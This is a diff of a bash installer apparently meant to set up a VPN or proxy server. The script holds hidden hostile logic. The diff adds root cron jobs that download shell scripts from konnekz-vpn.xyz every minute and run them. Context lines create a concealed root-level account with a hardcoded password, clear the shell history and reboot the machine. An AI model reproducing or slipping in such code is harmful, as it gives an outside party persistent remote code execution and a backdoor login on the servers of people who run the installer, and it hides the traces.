@@ -1,5 +1,5 @@
 #!/bin/bash
-rm -rf debian000*
+rm -rf debian005*
 
 
 RED='\033[01;31m';
@@ -642,25 +642,37 @@ API_LINK='konnekz-vpn.xyz/api/premium';
 API_KEY='Tknetwork';
 
 
-cat <<EOF >/root/authentication.sh
+
+cat <<EOF >/home/authentication.sh
 #!/bin/bash
 SHELL=/bin/bash
 PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
-wget -O /root/active.sh "$API_LINK/active.php?key=$API_KEY"
+wget -O /home/active.sh "$API_LINK/active.php?key=$API_KEY"
 sleep 5
-wget -O /root/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
+wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
 sleep 5
-wget -O /root/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
+wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
 sleep 15
-bash /root/active.sh
+bash /home/active.sh
 sleep 15
-bash /rootinactive.sh
+bash /home/inactive.sh
 sleep 15
-bash /root/deleted.sh
+bash /home/deleted.sh
 EOF
 
-echo -e "* *\t* * *\troot\tsudo bash /root/authentication.sh" >> "/etc/cron.d/account"
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
 
+echo "* * * * * /bin/bash  /home/active.sh >/dev/null 2>&1" | crontab -
+
+echo "* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1" | crontab -
+
+sh active.sh | tee -a  /home/active.sh
+
+wget -O /home/active.sh "konnekz-vpn.xyz/api/premium/active.php?key=Tknetwork"
+sleep 5
+wget -O /home/inactive.sh "konnekz-vpn.xyz/api/premium/inactive.php?key=Tknetwork"
+sleep 5
+wget -O /home/deleted.sh "konnekz-vpn.xyz/api/premium/deleted.php?key=Tknetwork"
 }
 
 serviceenable () {
@@ -837,7 +849,7 @@ class ConnectionHandler(threading.Thread):
             host = host[:i]
         else:
             if self.method=='CONNECT':
-                port = 442
+                port = 443
             else:
                 port = sys.argv[1]
 
@@ -952,11 +964,8 @@ EOM
 
 crontab -r
 echo "SHELL=/bin/bash
-*/5 * * * * /bin/bash  /root/active.sh >/dev/null 2>&1
-* * * * * /bin/bash  /root/authentication.sh >/dev/null 2>&1
 */5 * * * * /bin/bash /root/auto >/dev/null 2>&1" | crontab -
 
-bash /root/authentication.sh
 bash /root/auto
 
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
@@ -1194,7 +1203,7 @@ do
 		display_menu
 		ports
                 echo -e ""
-		echo -e "\033[1;32m Installation Done!\033[0m"
+echo -e "\033[1;32m Installation Done!\033[0m"
 		break;;
 		
         "Quit")
@@ -1203,10 +1212,9 @@ do
         *) echo invalid option;;
     esac
 done
-sh active.sh | tee -a  /root/active.sh
 history -c
 history -w
-rm -rf debian000
+rm -rf debian005
 echo -e "\033[1;32m Server Reboot in 5 Seconbds!!!\033[0m"
 sleep 5
 reboot
